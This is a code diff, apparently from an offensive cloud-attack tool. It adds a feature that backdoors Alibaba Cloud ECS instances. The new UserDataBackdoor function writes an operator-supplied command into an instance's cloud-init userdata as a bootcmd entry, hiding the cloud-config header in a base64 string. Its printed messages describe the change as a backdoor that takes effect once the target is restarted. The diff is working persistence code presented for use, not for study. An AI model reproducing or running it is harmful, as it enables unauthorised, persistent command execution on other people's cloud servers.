@@ -98,7 +98,7 @@ func DescribeInvocationResults(region string, CommandId string, InvokeId string,
 	return output
 }
 
-func ECSExec(command string, commandFile string, scriptType string, specifiedInstanceID string, region string, batchCommand bool, userData bool, metaDataSTSToken bool, ecsFlushCache bool, lhost string, lport string, timeOut int, ecsExecAllRegions bool) {
+func ECSExec(command string, commandFile string, scriptType string, specifiedInstanceID string, region string, batchCommand bool, userData bool, metaDataSTSToken bool, ecsFlushCache bool, lhost string, lport string, timeOut int, ecsExecAllRegions bool, userDataBackdoor string) {
 	var InstancesList []Instances
 	if ecsFlushCache == false {
 		data := cmdutil.ReadECSCache("alibaba")
@@ -197,7 +197,9 @@ func ECSExec(command string, commandFile string, scriptType string, specifiedIns
 		var num = 0
 		for _, i := range InstancesList {
 			specifiedInstanceID := i.InstanceId
-			if i.Status == "Running" {
+			if userDataBackdoor != "" {
+				UserDataBackdoor(i.RegionId, userDataBackdoor, specifiedInstanceID, timeOut, scriptType, i.OSType,)
+			} else if i.Status == "Running" {
 				num = num + 1
 				InstanceName := i.InstanceName
 				region := i.RegionId
@@ -348,4 +350,27 @@ func getMetaDataSTSToken(region string, OSType string, scriptType string, specif
 		commandResult = getExecResult(region, command, OSType, scriptType, specifiedInstanceID, timeOut)
 	}
 	return commandResult
+}
+
+func UserDataBackdoor(region string, command string, specifiedInstanceID string, timeOut int, scriptType string, OSType string) string {
+	request := ecs.CreateModifyInstanceAttributeRequest()
+	request.Scheme = "https"
+	request.InstanceId = specifiedInstanceID
+	userdata ,_ := base64.StdEncoding.DecodeString("I2Nsb3VkLWNvbmZpZwpib290Y21kOgogIC0g")
+	userdataStr := string(userdata)
+	userdataStr = fmt.Sprintf("%s%s", userdataStr, command)
+	userdataStr = base64.StdEncoding.EncodeToString([]byte(userdataStr))
+	request.UserData = userdataStr
+	response, err := ECSClient(region).ModifyInstanceAttribute(request)
+	errutil.HandleErr(err)
+	commandResult := response.GetHttpStatus()
+	if commandResult == 200 {
+		fmt.Println("执行成功，正在查询userdata值 (The execution is successful, and the userdata value is being queried)")
+		commandResult := getUserData(region, OSType, scriptType, specifiedInstanceID, timeOut )
+		fmt.Println(commandResult)
+		fmt.Println("如需使后门立即生效，请重启目标服务器 （For the backdoor to take effect immediately, please restart the target instance")
+	} else {
+		fmt.Println("写入失败，请确认是否有ModifyInstanceAttribute权限 （Failed to write, please confirm whether you have the ModifyInstanceAttribute permission）")
+	}
+	return ""
 }
